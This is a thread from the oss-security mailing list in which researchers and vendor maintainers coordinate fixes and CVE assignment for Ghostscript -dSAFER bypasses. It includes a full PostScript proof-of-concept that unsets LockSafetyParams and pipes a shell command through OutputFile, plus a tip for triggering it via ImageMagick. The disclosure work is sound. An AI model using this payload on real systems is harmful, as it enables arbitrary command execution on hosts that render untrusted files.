  oss-security - Re: Re: More Ghostscript Issues: Should we disable PS  coders in policy.xml by default?            Products  Openwall GNU/*/Linux   server OS Linux Kernel Runtime Guard John the Ripper   password cracker  Free & Open Source for any platform in the cloud Pro for Linux Pro for macOS  Wordlists   for password cracking passwdqc   policy enforcement  Free & Open Source for Unix Pro for Windows (Active Directory)  yescrypt   KDF & password hashing yespower   Proof-of-Work (PoW) crypt_blowfish   password hashing phpass   ditto in PHP tcb   better password shadowing Pluggable Authentication Modules scanlogd   port scan detector popa3d   tiny POP3 daemon blists   web interface to mailing lists msulogin   single user mode login php_mt_seed   mt_rand() cracker  Services Publications  Articles Presentations  Resources  Mailing lists Community wiki Source code repositories (GitHub) Source code repositories (CVSweb) File archive & mirrors How to verify digital signatures OVE IDs  What's new         Follow @Openwall on Twitter for new release announcements and other news   [<prev] [next>] [<thread-prev] [thread-next>] [day] [month] [year] [list]  Date: Tue, 4 Sep From: Tavis Ormandy <taviso@...gle.com> To: oss-security@...ts.openwall.com Subject: Re: Re: More Ghostscript Issues: Should we disable PS  coders in policy.xml by default?  Thanks Marcus. FWIW, over the weekend upstream fixed all of the bugs I had opened. Just looking this morning and I can see one or two of the fixes were incomplete, I'll file new bugs and hopefully new fixes make it into release.  (I'm only fuzzing with sort -R < postscript_commands.txt | gs -dSAFER, so totally possible we'll have to do this again soon)  Tavis.  (p.s. I'm not exaggerating about the sort -R, that's literally how I'm fuzzing it)  On Mon, Sep 3, at AM Marcus Meissner <meissner@...e.de> wrote:  > Hi, > > I am still holding back CVE requesting as CERT promised to do this. > > If they do not reply with a plan until tomorrow I will proceed with > requesting. > > Ciao, Marcus > On Wed, Aug 29, at Tavis Ormandy wrote: > > I should note, just add `userdict /setpagedevice undef` at the top if you > > want to test it with ImageMagick. > > > > Tavis. > > > > On Wed, Aug 29, at PM Tavis Ormandy <taviso@...gle.com> wrote: > > > > > Thanks Marcus, here are some more necessary commits: > > > > > > > > > > > > > # D /invalidaccess checks stop working after a failed restore > > > > > > > > > > # gssetresolution memory corruption > > > > > > > > > > # handling /undefined results in SEGV > > > > > > > > > > # PDF interpreter can leave dangerous operators available > > > > > > Please note that not all issues are resolved, and I have exploits that > > > still work against HEAD. > > > > > > For example, this will still work if you pull master as of this > writing: > > > > > > $ cat testcase.pdf > > > %!PS > > > % This is ghostscript bug (split out from bug > > > > > > a0 % just select a papersize to initialize page device > > > > > > % You can't def HWResolution (for example), because currentpagedevice > is > > > readonly: > > > % > > > % GS>currentpagedevice wcheck == > > > % false > > > % > > > % But you can just put or astore into it, because the array itself is > > > writable: > > > % GS>currentpagedevice /HWResolution get wcheck == > > > % true > > > % > > > % If you put some junk in there, then grestore stops working. > > > currentpagedevice /HWResolution get 0 (foobar) put > > > > > > % this grestore will fail, `stopped` just handles the error instead of > > > aborting. > > > { grestore } stopped {} if > > > > > > % now LockSafetyParams will be incorrectly unset, you can check like > this: > > > % GS>mark currentdevice getdeviceprops .dicttomark /.LockSafetyParams > get > > > == pop > > > % false > > > > > > % we can change and configure devices now, so make sure we're using one > > > with > > > % a OutputFile property. > > > (ppmraw) selectdevice > > > > > > % run a shell command > > > mark /OutputFile (%pipe%id) currentdevice putdeviceprops > > > showpage > > > $ evince testcase.pdf > > > > > > > > > (libspectre) ghostscript reports: ioerror -12 > > > > > > Tavis. > > > > > > On Tue, Aug 28, at AM Marcus Meissner <meissner@...e.de> > wrote: > > > > > >> Hi, > > >> > > >> I had 4 CVEs assigned yesterday afternoon already working from CERTs > list, > > >> see inline comments below. Please adjust if something is incorrect in > > >> them. > > >> > > >> CERT has mailed overnight that they will take care of the CVE > assignment, > > >> so > > >> I am defering the rest to them. > > >> > > >> Ciao, Marcus > > >> > > >> On Mon, Aug 27, at Tavis Ormandy wrote: > > >> > Here is an update, Artifex made a press release > > >> > < > > >> > > > >> > > > >> > listing > > >> > some necessary commits, but the list was incomplete. > > >> > > > >> > Here is a list of relevant commits I'm aware of so far, some issues > are > > >> > still open with working exploits available. It's my understanding > that > > >> no > > >> > new release is planned until late September, and vendors need to > either > > >> > ship a git snapshot when all issues are resolved, or apply patches. > I > > >> have > > >> > testcases for each problem, but I think the bugs will be visible > > >> eventually > > >> > so I'm not posting them here. > > >> > > > >> > > > >> > > > >> > # > > >> > handling /undefined results in SEGV > > >> > > > > >> > # missing type check in ztype > > >> > > # > > >> > A /invalidaccess checks stop working after a failed restore > > >> > > > > >> # > > >> > B /invalidaccess checks stop working after a failed restore > > >> > > > > >> # > > >> > C /invalidaccess checks stop working after a failed restore > > >> > > # > > >> > > >> > - missing type checking in setcolor > > >> > > # > > >> > > >> > > >> > > >> > - LockDistillerParams boolean missing type checks > > >> > > > > >>         > > >> > > >> > > >> > # - Bypassing PermitFileReading by handling undefinedfilename > > >> errors > > >> > > >> > > >> > > > >> > > > >> > # - shading_param incomplete type checking > > >> > > > >> > > > >> > # - shading_param incomplete type checking > > >>         > > >> > > >> > > >> > > > > >> > # - pdf14 garbage collection memory corruption > > >> > > > >> > > > >> > # - .setdistillerkeys memory corruption > > >> > > > > >> > # - corrupt device object after error in job > > >> > > >> > > >> > > > > >> > # - .tempfile SAFER restrictions seem to be broken > > >>         > > >> > > >> > > > >> > > > >> > > >> > > >> > # - memory corruption in aesdecode > > >> > > > > >> > > >>         > > >> > > >> > # - .definemodifiedfont memory corruption if /typecheck is > > >> handled > > >> > > > >> > Tavis > > >> > > > >> > On Thu, Aug 23, at AM Bob Friesenhahn < > > >> > bfriesen@...ple.dallas.tx.us> wrote: > > >> > > > >> > > On Thu, 23 Aug Leonardo Taccari wrote: > > >> > > > > > >> > > > (Regarding the `file.ps2' and `file.ps3' examples without > `PS2:' or > > >> > > > `PS3:' prefixes according `convert -debug Policy -log "%e"' it > seems > > >> > > > that they ends up as: > > >> > > > > > >> > > > Domain: Coder; rights=Read; pattern="PS" ... > > >> > > > > > >> > > > ...so should be blocked by the workaround described in > > >> > > > But please correct me if I'm wrong.) > > >> > > > > >> > > This is likely due to header magic detection (e.g. > "%!PS-Adobe").  It > > >> > > is possible that a different path will be taken if the common > > >> > > Postscript header is not detected.  The file extension may then be > > >> > > used as a hint.  Also, there are a wide varieties of ImageMagick > > >> > > versions in use, with a wide variety of behaviors. > > >> > > > > >> > > The version of ImageMagick provided by the Ubuntu Linux I am > using at > > >> > > this moment dates from > > >> > > > > >> > > Bob > > >> > > -- > > >> > > Bob Friesenhahn > > >> > > bfriesen@...ple.dallas.tx.us, > > >> http://www.simplesystems.org/users/bfriesen/ > > >> > > GraphicsMagick Maintainer,    http://www.GraphicsMagick.org/ > > >> > > > > >> > > >> -- > > >> Marcus Meissner,SUSE LINUX GmbH; Maxfeldstrasse 5; Nuernberg; > Zi. > > >> < > > >> meissner@...e.de> > > >> > > > > > -- > Marcus Meissner,SUSE LINUX GmbH; Maxfeldstrasse 5; Nuernberg; Zi. > < > meissner@...e.de> >   Powered by blists - more mailing lists  Please check out the  Open Source Software Security Wiki, which is counterpart to this mailing list.  Confused about mailing lists and their use? Read about mailing lists on Wikipedia and check out these guidelines on proper formatting of your messages.      